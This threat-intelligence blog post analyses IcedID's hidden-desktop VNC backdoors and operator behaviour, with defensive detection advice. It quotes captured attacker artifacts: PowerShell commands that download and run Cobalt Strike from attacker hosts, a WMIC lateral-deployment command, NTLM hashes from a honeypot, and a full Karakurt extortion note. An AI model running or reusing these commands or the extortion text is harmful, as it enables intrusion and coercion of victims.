BokBot) is a popular Trojan who first emerged in 2017 as an Emotet delivery.](https://securityintelligence.com/new-banking-trojan-icedid-discovered-by-ibm-x-force-research/)\nOriginally described as a banking Trojan, IcedID shifted its focus to embrace the\nextortion/ransom trend and nowadays acts as an initial access broker mostly delivered\nthrough malspam campaigns. Over the last few years, IcedID has commonly been seen\ndelivering Cobalt Strike prior to a multitude of ransomware strains such as Conti or REvil.\n\nIcedID itself is composed of multiple modules, one of which is a poorly documented VNC\n[backdoor (Virtual Network Computing) acting as a cross-platform remote desktop solution.](https://en.wikipedia.org/wiki/Virtual_Network_Computing)\nExistence of this module (branded “HDESK” or “HDESK bot”) is just partially mentioned by\n[Malwarebytes (2017) and](https://www.malwarebytes.com/blog/news/2019/12/new-version-of-icedid-trojan-uses-steganographic-payloads) [Kaspersky (2021) while its usage has been widely observed and](https://securelist.com/trickbot-module-descriptions/104603/)\n[occasionally vulgarized as “Dark VNC”.](https://isc.sans.edu/diary/rss/29210)\n\nAs part of our research efforts, NVISO has been analyzing IcedID’s command & control\ncommunications. In this blog-post we will share insights into IcedID’s VNC backdoor(s)\n**as seen from an attacker’s perspective, insights we obtained by extracting and**\n[reassembling VNC (RFC6143) traffic embedded within private and public captures published](https://www.rfc-editor.org/rfc/rfc6143)\nby Brad Duncan.\n\nIn this post we introduce the three variants we observed as well as their capabilities: Dark\nCat, Anubis and Keyhole. We’ll follow by exposing common techniques employed by the\noperators before revealing information they leaked through their clipboard data.\n\n## HDESK Variants\n\nDuring our analysis of both public and private IcedID network captures, we identified 3 VNC\nbackdoor variants, all part of the HDESK strain. These backdoors are typically activated\nduring the final initial-access stages to initiate hands-on-keyboard activity. Supposedly short\nfor “Hidden Desktop”, HDESK leverages Windows features allowing the backdoor to create a\nhidden desktop environment not visible to the compromised user. Within this hidden\nenvironment, the threat actors can start leveraging the user interface to perform regular tasks\nsuch as web browsing, reading mails in Outlook or executing commands through the\nCommand Prompt and PowerShell.\n\nWe believe with medium confidence that these backdoors are not exclusive to IcedID as we\noccasionally observed their usage alongside network traffic attributed by third-party vendors\nto other access-broker families.\n\n\n-----\n\n## Dark Cat VNC\n\nThe “Dark Cat VNC” variant was first observed in November 2021 and is believed to be the\nnamed releases v1.1.2 and v1.1.3. Its usage was still extensively observed by the end of\n2022. Upon initial access, the home screen presents the operator with multiple options to\ncreate new sessions alongside backdoor metrics such as idle time or lock state.\n\nFigure 1: The Dark Cat VNC interface.\n\n### User Session\n\nFigure 2: A Dark Cat USER session.\nThe USER session exists in three variations (read, standard and black) which allows the\noperator to switch the VNC view to the user’s visible desktop.\n\n### HDESK Session\n\nThe HDESK session exists in three variations as well: standard, Tmp and NM (also called bot).\nThis session type causes the backdoor to create a new hidden desktop not visible to the\ncompromised user.\n\nBased on the activity we observed, the HDESK sessions are (understandably) preferred by the\noperators.\n\n\n-----\n\nFigure 3: A Dark Cat HDESK session.\nAs HDESK sessions by default do not benefit from Windows’s built-in UI, operators are\npresented with an alternative start-menu to launch common programs. In Dark Cat these are\nChrome, Firefox, Internet Explorer, Outlook, Command Prompt, Run and the Task Manager.\nA Windows Shell button is also foreseen which we believe, if used, will spawn the regular\nWindows UI most of the users are used to. Starting with Dark Cat v1.1.3 Edge Chromium\nfurthermore joins the list of available software.\n\nFigure 4: The Dark Cat HDESK session interface.\nBesides the alternate start-menu, operators can access some settings using the top-left\norange icon which includes:\n\nDefining the hidden windows’ sizes.\nDefining the Chrome profile to use (lite or not).\nDeleting the browser’s profile(s).\nKilling the child process(es).\n\nFigure 5: The Dark Cat HDESK settings interface.\n\n### WebCam Session\n\n\n-----\n\nThe WebCam sessions exist in three variations. While we were unable to capture its usage\n(honeypots lack webcams and operators do not attempt to use this session kind), its\npresence suggests IcedID’s VNC backdoors are capable of capturing compromised devices’\nwebcam feeds.\n\n## Anubis VNC\n\nThe “Anubis VNC” variant was first observed in January 2022 and is believed to be the\nnamed release v1.2.0. Its usage was last observed in Q3 2022. No capability differences\nwere observed between Anubis and Dark Cat v1.1.3.\n\nFigure 6: The Anubis VNC interface.\n\n## KEYHOLE VNC\n\nThe “KEYHOLE VNC” variant was first observed in October 2022 and is believed to be the\nnamed releases v1.3 as well as v2.1. Its usage was observed as recently as Q1 2023.\n\n### Grayscale\n\nThe first major change observed within Keyhole is its new color palette capability where\n[operators can pick regular RGB (a.k.a. colored) or](https://en.wikipedia.org/wiki/RGB_color_model) [Grayscaled (a.k.a. black & white) feeds.](https://en.wikipedia.org/wiki/Grayscale)\nThe actual intend of this feature is unclear as, at least from a network perspective, both RGB\nand Grayscale consume as many bytes per pixel, resulting in equal performances.\n\n\n-----\n\nFigure 7: The Keyhole color palette selector.\n\n### HDESK Sessions\n\nKeyhole v1.3 provides a refreshed start-menu where icons have been updated and options\nrenamed; The once cryptic Win Shell option has been rebranded to the My Computer\noption.\n\n\n-----\n\nFigure 8: The Keyhole (v1.3) HDESK session interface in gray-scaled color palette.\nLater-on, with v2.1, Keyhole renamed additional options and introduced the PowerShell and\n```\nDesktop options. We assess with low confidence that the Desktop option only differs from the\nMy Computer option by rendering the background as well, whereas the latter option was only\n\n```\nseen generating desktop views without background image.\n\nFigure 9: The Keyhole (v2.1) HDESK session interface\n\n\n-----\n\n## Modus Operandi\n\nObtaining recordings of threat actors operating is useful to understand which technical\ncapabilities they are equipped with, but also allows the identification of TTPs (Tactics,\nTechniques & Procedures) they might employ. In the following section we will review some of\nthe most re-occurring actions we observed IcedID operators perform through the above\ndescribed backdoors.\n\n🍯 **Nothing confidential here…**\n\n[All media published within this section were reconstructed from publicly published artifacts.](https://malware-traffic-analysis.net/)\nAs all information is public, we have refrained from redacting otherwise sensitive details such\nas company names and accounts.\n\n## Task Manager\n\nTo no surprise, the usage of the Task Manager to identify running software was extremely\ncommon. While hard to detect as operators did not attempt to interfere with security\nsoftware, the usage of this graphical utility outlined one interesting drawback. On multiple\n(non-published) occasions we observed actors identifying known security tooling based on\nthe process icon whereas other icon-less tooling blended in with many of Windows’ icon-less\napplications.\n\nFigure 10: An Anubis operator performing interactive reconnaissance through the Task\nManager.\n\n## Outlook\n\nAnother quite common technique was the inspection of Outlook, most likely to identify poorlypopulated honeypot networks. As was the case for the Task Manager, the graphical usage of\nOutlook by the operator is indistinguishable from regular user activity. From the available\nrecordings, no attempts were made to use Outlook for further phishing/spam.\n\nFigure 11: An Dark Cat operator performing interactive reconnaissance through Outlook.\n\n\n-----\n\nFigure 12: A Dark Cat operator inspecting Outlook’s “Rules and Alerts” settings.\nOn one singular instance, we observed the actor expressing interests in Outlook’s rules. The\nbackdoor session was however terminated before they undertook any actions making it\nunclear whether this was part of the reconnaissance activities or were planning to set up\nmalicious email redirection rules.\n\n## Web Browsers\n\nFrom the available browsers, Edge and Chrome were the favorites. Using these, operators\ncommonly validated the browser’s connectivity by accessing Amazon.\n\nDuring one intrusion, the operator went as far as attempting to access the compromised\nuser’s Amazon payment information. This attempt is a good reminder that beyond a user’s\ncorporate identity, personal accounts are definitely at risk as well.\n\n\n-----\n\nFigure 13: A Dark Cat operator accessing Amazon’s “Your Payments” account page.\n\nFigure 14: A Keyhole operator inspecting Edge’s version details.\nOn some occasions operators accessed the edge://version URL. While this page exposes\nmostly useless information to attackers, the capture provides a sheer amount of uncommon\nflags usable for threat hunting.\n\n\n-----\n\nNoteworthy is the Profile path located within the user s temporary directory and passed\nusing the --user-data-dir= flag, a pattern that from our available telemetry seems quite\nuncommon for msedge.exe in enterprise environments. The pattern is however occasionally\nused for applications such as opera_autoupdate.exe and msedgewebview2.exe.\n\nAlso worth noting is the usage of edge://settings/passwords to identify additional\naccounts.\n\nFigure 14: A Keyhole operator interactively inspecting Edge’s stored passwords.\n\n\n-----\n\nFigure 15: Edge displaying a warning banner due to the usage of an unsupported flag during\na Dark Cat session.\nA final commonly observed pattern is the usage of the unsupported --no-sandbox\ncommand-line flag in Edge resulting in a notification banner. From our available telemetry in\nenterprise environments, the usage of this flag for Edge is uncommon, as opposed to\nElectron-based applications (including Microsoft Teams and WhatsApp) who extensively use\nit.\n\n## Explorer\n\nAnother commonly observed utility to inspect the compromised devices’ files and folders,\nincluding payloads dropped through other channels, is Windows Explorer. As was the case\nwith Outlook, Explorer’s usage is indistinguishable from legitimate use making it a hard to\ndetect technique.\n\nFigure 16: A Keyhole operator interactively using Explorer to inspect folders.\n\n## Command Prompt\n\nLast but not least, the command prompt was obviously used extensively. Usage of the\ncommand prompt is commonly leveraged for reconnaissance activities, including the usage\nof:\n```\n   whoami /upn for system user discovery (T1033)\n\n```\n\n-----\n\n```\n   ipconfig for system network configuration discovery (T1016).\n   arp -a for both remote system discovery (T1018) and device identification based on\n\n```\nthe [MAC address.](https://en.wikipedia.org/wiki/MAC_address)\n```\n   dir for file and directory discovery (T1083) over SMB (T1021.002).\n   nltest /dclist for the remote discovery of the domain controllers (T1018).\n   ping for network connectivity tests to remote systems (T1018).\n\n```\n[PowerShell (T1059.001) to deploy Cobalt Strike.](https://attack.mitre.org/techniques/T1059/001/)\n\nAs opposed to the previous mostly passive TTPs, the active usage of the Command Prompt\nand PowerShell is often where detection rules obtain a competing chance.\n\nFigure 17: An Anubis operator performing initial reconnaissance using the Command Prompt\nin an HDESK session.\n\n## Clipboard Leaks\n\nAs VNC acts as a remote desktop solution, another trove of data was found within the\nclipboard synchronization feature. By copy/pasting between victim and attacker machines,\noperators exposed some additional TTPs and information surrounding their operations.\n\nIn this section we will expose the most common and interesting data found within their\nclipboards.\n\n## Cobalt Strike\n\nAs expected, many variations of Cobalt Strike downloaders were observed. These leveraged\nboth IPs and domain names, as well as standard and non-standard ports such as HTTP on\nport 443 or HTTPS on port 8080.\n```\nIEX ((new-object net.webclient).downloadstring('http://89.163.251.143:80/a'))\n\nIEX ((new-object net.webclient).downloadstring('http://146.0.72.85:443/waw'))\n\nIEX ((new-object net.webclient).downloadstring('https://searcher.host/a80lvl'))\n\npowershell.exe -nop -w hidden -c \"IEX ((new-object\nnet.webclient).downloadstring('https://solvesalesoft.com:8080/coin'))\"\n\n\n```\nIn some cases, the operators directly leveraged PowerShell shellcode stagers as shown in\nthe following trimmed command.\n```\npowershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPA...AGQAKAApADsA\n\n\n```\nFor compromised accounts with sufficient access, WMIC commands were further issued to\ndeploy Cobalt Strike on remote appliances.\n```\nC:\\Windows\\System32\\wbem\\wmic.exe /node:10.6.21.140 process call create \"cmd.exe /c\npowershell.exe -nop -w hidden -c \"\"IEX ((new-object\nnet.webclient).downloadstring('https://solvesalesoft.com:8080/coin'))\"\"\"\n\n```\n\n-----\n\nFinally, although we were unable to identify which tooling would rely on such a format, actors\nleaked what appears to be a naming convention.\n```\nplugin_cobalt_126_8888\n\nplugin_cobalt_126_8080\n\nplugin_cobalt_126_443\n\n\n## Rundll32\n\n```\nBesides Cobalt Strike, operators exposed a DllRegisterServer command which Unit 42\nobserved being used with rundll32.exe and attributed to the deployment of a VNC\nbackdoor.\n```\nDllRegisterServer --id %id% --group %group% --ip\n87.120.8.190,158.69.133.70,185.106.120.99,45.14.226.195,103.124.106.154,149.3.170.201,\n\n\n## NTLM Hashes\n\n```\nAnother interesting finding was the presence of NTLM hashes within the clipboard data,\nexposing the compromise’s scope. In this case, the impacted organization was part of a\nhoneypot environment.\n```\nDESKTOP-4GDQQL7\\admin 4081e42481a5986e9bfcb7000bbe98f4\n\nTECHHIGHWAY-DC\\Administrator 4081e42481a5986e9bfcb7000bbe98f4\n\nTECHHIGHWAY-DC\\bennie.mcbride 4081e42481a5986e9bfcb7000bbe98f4\n\nTECHHIGHWAY-DC\\brenda.richardson 4081e42481a5986e9bfcb7000bbe98f4\n\nTECHHIGHWAY-DC\\daryl.wood 4081e42481a5986e9bfcb7000bbe98f4\n\nTECHHIGHWAY\\daryl.wood 4081e42481a5986e9bfcb7000bbe98f4\n\nTECHHIGHWAY-DC\\saul.underwood 4081e42481a5986e9bfcb7000bbe98f4\n\nDESKTOP-4GDQQL7\\WDAGUtilityAccount 7cd5fddee0cd00dde47014fe7f52faa4\n\nTECHHIGHWAY-DC\\krbtgt a7b565c147b69380d0b35f37ce478a1c\n\n\n## Attacker Notes\n\n```\nWhile the above findings do not aid attribution, one operator did leak their intrusion notes.\nWithin these notes (“[...]” trimmed for readability) we can observe Russian annotations,\n[commonly related to CIS-based crime groups, as well information on then-ongoing breaches.](https://en.wikipedia.org/wiki/Commonwealth_of_Independent_States)\nA couple of days after the network traffic was taken, two non-honeypot companies\n[mentioned within these notes were listed on the Black Basta ransomware group’s leak site.](https://web.archive.org/web/20230317193429/https://www.hhs.gov/sites/default/files/black-basta-threat-profile.pdf)\n\n\n-----\n\n```\n[...]\n\nHostname CTYMNGR1 =ist ne v domene\n\nHostname PCCXCNAU001 (4)-no ad/da/error\n\nHostname W10EQZAFI10027 -?ff ne prishla\n\nHostname NPD104 -24 host (7)\n\nHostname DESKTOP-3R921OV -small\n\n[...]\n\nHostname CAS-TAB0010 [...] 28m 9prosto) yshla v off/sdelal zakrep MSNDevices?\n\nHostname PC-REC-LEFT-10 --???? ? ?? ????\n\nHostname TRAINING - w craneserviceco.com 20m (???) razobral\n\n[...]\n\nHostname RM6988 msystemscompany.com 32m (??????) ?????????? ? ???? ?? ??????????\n???????? + ???????? ???????\n\nHostname EXIRP316151 ?????? ?? ????? ???????\n\nHostname ADMIN201 ???? ? ???\n\n[...]\n\nHostname ODSCHEDULING [...] 12m work7---yshla v off\n\nHostname MDC1104 [...] 11m istok razobral\n\n## Ransom Notes\n\n```\nAnother recovered artifact was a full ransom note where authors identified themselves as\n[belonging to the Karakurt Team. While this note did not allow for the identification of its](https://web.archive.org/web/20230317192852/https://www.hhs.gov/sites/default/files/karakurt-threat-profile-analyst-note.pdf)\nvictim, it is further evidence of IcedID’s role within the access broker ecosystem.\n\n\n-----\n\n```\nOk, you are reading this so it means that we have your attention.\n\nHere's the deal :\n\n1. We breached your internal network and took control over all of your systems.\n\n2. We analyzed and located each piece of more-or-less important files while spending\nweeks inside.\n\n3. We exfiltrated anything we wanted (the total size of taken data exceeds 372 GB).\n\nFAQ:\n\n- Who the hell are you?\n\n- The Karakurt Team. Pretty skilled hackers I guess.\n\n- WHY ARE YOU DOING THIS?!??\n\n- Our motivation is purely financial.\n\n- We are going to report this to law enforcement.\n\n- You surely can, but be ready that they will confiscate most of your IT\ninfrastructure, and even if you will later change your mind and decide to pay - they\nwill not let you.\n\n- Who else already knows about the breach?\n\n- Only You, who received the same message the same way. Nobody else. For now.\n\n- What if I tell you that I do not care and going to ignore this incident.\n\n- That's a very bad choice. If you will not contact us in a timely manner (by\n07.01.2022) we will start notifying your employees, clients, partners, subcontractors\nand any other persons that should know how you treat your own corporate secrets and\ntheirs.\n\n- What if I will not contact you even after it?\n\n- Than we shall move forward and start contacting your business competitors and list\nof anonymous inside traders we deal with, to find out if they are going to pay us for\nyour data. When the list of the people who is interested in such data is formed - the\nclosed online auction starts.\n\n- None will buy what you took! I do not believe you!\n\n- If the auction fails - we will just leak everything online, making sure that this\nleak goes straight to the press. We will make sure that your business will bleed by\nusing any power we have in our posession, both social and technical.\n\n- What happens if I pay?\n\n- Nothing bad will happen.\n\nWe will remove everything we took from your network and leave you be.\n\nWe will provide the confirmation that the data is deleted.\n\nWe will help you to close technical vulnerabilities you have and provide some insight\non how to avoid such incidents if some other perpetrator is interested in you.\n\nWe will never tell anybody about it.\n\n- We understand. We are ready to move forward.\n\n- You will find the Access Code at the end of this file, you will need this one to\nget in contact with us for further instructions\n\nTo contact us using this ID you should do the following :\n\n```\n\n-----\n\n```\n1. Download Tor browser https://www.torproject.org and install it.\n\n2. Open link in TOR browser https://omx5iqrdbsoitf3q4xexrqw5r5tfw7vp3vl3li3lfo7saabxazshnead.onion\n\n3. Insert Access Code 70fdca335aa3fd45a182f39b2592a5d0 inside the field on the page\nand click Enter.\n\n4. The chat window will open and we will be able to communicate through a secured\nchannel.\n\nThis link is available via \"Tor Browser\" only!\n\n\nAs a gesture of goodwill, we are ready to give you another leak - it is exclusive and\nfresh as well. Just let us know if you are interested in cooperation.\n\n## Key Takeaways\n\n```\nWhile it may not be complex to detect IcedID itself (any modern EDR should detect the\n```\nrundll32.exe abuse), distinguishing which interactive actions were taken through a VNC\n\n```\nbackdoor does pose challenges. Focus is often put on command-based executions without\nconsidering what could otherwise be considered legitimate user processes such as web\nbrowsers or Outlook. Understanding how these backdoors operate improve responsive and\nforensic capabilities by, for example, allowing the identification and explanation of Edge\nprocesses with unlikely or unsupported flags.\n\nThis blog post further outlined the capability of network-level visibility which, for complex or\nBYOD (Bring Your Own Device) environments, may cope with the lack of endpoint visibility.\nWithin this spirit, we would like to outline the effectiveness of the Snort IDS rules published\nby Networkforensic with regards to the detection of IcedID command & control\ncommunications.\n\nIf you are facing challenges keeping your environment clean or need help due to a\n[compromise, do not hesitate to reach out; NVISO can help!](https://www.nviso.eu/en/services)\n\n\n-----\n\nMaxime Thiebaut\nMaxime Thiebaut is a GCFA-certified researcher within NVISO Labs.
